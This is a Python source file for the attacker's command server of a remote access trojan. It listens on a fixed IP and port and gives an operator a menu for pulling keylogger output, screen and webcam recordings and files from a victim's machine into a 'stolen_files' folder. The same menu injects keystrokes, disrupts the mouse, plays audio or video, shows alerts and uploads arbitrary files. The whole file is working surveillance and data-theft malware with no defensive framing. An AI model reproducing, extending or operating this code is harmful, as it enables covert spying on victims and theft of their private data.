import socket
import os
import inquirer

if __name__ == "__main__":
    host = "172.31.41.57"
    port = 5588

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(1)
    print()
    print("Server listening...")
    print()
    conn, addr = sock.accept()
    print("Connection established to:", addr[0], "\n")

    while True:
        list = [inquirer.List(
            "commands",
            message="Select command",
            choices = [
                "Get keylogger",
                "Get screen recording",
                "Get camera recording",
                "Play audio",
                "Send alert",
                "Enter keyboard command",
                "Bug victim's mouse",
                "Play video",
                "File system",
                "Disconnect"
            ]
        )]
        command = inquirer.prompt(list)["commands"]
        conn.send(command.encode())
        if command == "Get keylogger":
            file_data = conn.recv(1024)
            file_buffer = b""
            conn.settimeout(1)
            while file_data:
                file_buffer = b"".join([file_buffer, file_data])
                try:
                    file_data = conn.recv(1024)
                except socket.timeout:
                    break
            conn.settimeout(None)
            os.chdir("stolen_files")
            file = open("keylogger.txt", "wb")
            file.write(file_buffer)
            file.close()
            os.chdir("..")
        elif command == "Get screen recording":
            total_seconds = input("Number of seconds for screen recording: ")
            print()
            conn.send(total_seconds.encode())
            file_data = conn.recv(1024)
            file_buffer = b""
            conn.settimeout(1)
            while file_data:
                file_buffer = b"".join([file_buffer, file_data])
                try:
                    file_data = conn.recv(1024)
                except socket.timeout:
                    break
            conn.settimeout(1)
            os.chdir("stolen_files")
            file = open("screenrecord.mp4", "wb")
            file.write(file_buffer)
            file.close()
            os.chdir("..") 
        elif command == "Get camera recording":
            total_seconds = input("Number of seconds for camera recording: ")
            print()
            conn.send(total_seconds.encode())
            file_data = conn.recv(1024)
            file_buffer = b""
            conn.settimeout(1)
            while file_data:
                file_buffer = b"".join([file_buffer, file_data])
                try:
                    file_data = conn.recv(1024)
                except socket.timeout:
                    break
            conn.settimeout(None)
            os.chdir("stolen_files")
            file = open("camrecording.mp4", "wb")
            file.write(file_buffer)
            file.close()
            os.chdir("..") 
        elif command == "Play audio":
            list = [inquirer.List(
                "commands",
                message="Select command",
                choices = [
                    "Play an MP3",
                    "Create a text-to-speech",
                    "Quit"
                ]
            )]
            if command != "Quit":
                command = inquirer.prompt(list)["commands"]
                if command == "Play an MP3":
                    conn.send("1 1".encode())
                elif command == "Create a text-to-speech":
                    text = input("Enter text to convert to speech: ")
                    print()
                    text = "|".join(text.split(" "))
                    conn.send(("1 2 " + text).encode())
                else:
                    conn.send("Quit".encode())
            else:
                conn.send("Quit".encode())
        elif command == "Send alert":
            alertTitle = input("Enter title for alert: ")
            alertMessage = input("Enter message for alert: ")
            print()
            alertTitle = "|".join(alertTitle.split(" "))
            alertMessage = "|".join(alertMessage.split(" "))
            conn.send(("2 " + alertTitle + " " + alertMessage).encode())
        elif command == "Enter keyboard command":
            list = [inquirer.List(
                "keyboard_interactions",
                message="Select a keyboard interaction",
                choices = [
                    "Typing",
                    "Command",
                    "Quit"
                ]
            )]
            if command != "Quit":
                command = inquirer.prompt(list)["keyboard_interactions"]
                keys = input("Enter keys in csv format (no spaces): ")
                print()
                if command == "Typing":
                    conn.send(("3 1 " + keys).encode())
                elif command == "Command":
                    conn.send(("3 2 " + keys).encode())
                else:
                    conn.send("Quit".encode())
            else:
                conn.send("Quit".encode())
        elif command == "Bug victim's mouse":
            conn.send("4".encode())
        elif command == "Play video":
            conn.send("5".encode())
        elif command == "File system":
            while True:
                list = [inquirer.List(
                    "commands",
                    message="Select command",
                    choices = [
                        "ls",
                        "pwd",
                        "cd",
                        "mkdir",
                        "get",
                        "put",
                        "Quit"
                    ]
                )]
                command = inquirer.prompt(list)["commands"]
                conn.send(command.encode())
                if command == "ls" or command == "pwd":
                    output = conn.recv(1024)
                    print("\033[1m" + "Output:" + "\033[0m")
                    conn.settimeout(1)
                    while output:
                        print(output.decode())
                        try:
                            output = conn.recv(1024)
                        except socket.timeout:
                            break
                    conn.settimeout(None)
                elif command == "cd":
                    directories_data = conn.recv(1024)
                    directories_buffer = b""
                    conn.settimeout(1)
                    while directories_data:
                        directories_buffer = b"".join([directories_buffer, directories_data])
                        try:
                            directories_data = conn.recv(1024)
                        except socket.timeout:
                            break
                    conn.settimeout(None)
                    directories = directories_buffer.decode()
                    if directories == "No Directories":
                        directories = ["Other"]
                    else:
                        directories = directories.split(" ")
                        directories = ["Other"] + directories
                    list = [inquirer.List(
                        "directories",
                        message="Select directory",
                        choices = directories
                    )]
                    directory = inquirer.prompt(list)["directories"]
                    if directory == "Other":
                        directory = input("Enter absolute directory path: ")
                        print()
                    conn.send(directory.encode())
                elif command == "mkdir":
                    directory = input("Enter directory name: ")
                    print()
                    conn.send(directory.encode())
                elif command == "get":
                    files_data = conn.recv(1024)
                    files_buffer = b""
                    conn.settimeout(1)
                    while files_data:
                        files_buffer = b"".join([files_buffer, files_data])
                        try:
                            files_data = conn.recv(1024)
                        except socket.timeout:
                            break
                    conn.settimeout(None)
                    files = files_buffer.decode()
                    if files == "No Files":
                        files = ["Other"]
                    else:
                        files = files.split(" ")
                        files = ["Other"] + files
                    list = [inquirer.List(
                        "files",
                        message="Select file",
                        choices = files
                    )]
                    file = inquirer.prompt(list)["files"]
                    if file == "Other":
                        file = input("Enter absolute path to file: ")
                        file_name = file.split("/")[-1]
                    else:
                        file_name = file
                    conn.send(file.encode())
                    os.chdir("stolen_files")
                    file_data = conn.recv(4096)
                    file_buffer = b""
                    conn.settimeout(1)
                    while file_data:
                        file_buffer = b"".join([file_buffer, file_data])
                        try:
                            file_data = conn.recv(4096)
                        except socket.timeout:
                            break
                    conn.settimeout(None)
                    file = open(file_name, "wb")
                    file.write(file_buffer)
                    file.close()
                    os.chdir("..")
                elif command == "put":
                    file_path = input("Enter absolute path to file: ")
                    file_name = input("Enter output file name: ")
                    print()
                    conn.send(file_name.encode())
                    conn.recv(1024)
                    file = open(file_path, "rb")
                    data = file.read()
                    conn.send(data)
                else:
                    break
        else:
            break

    sock.close()
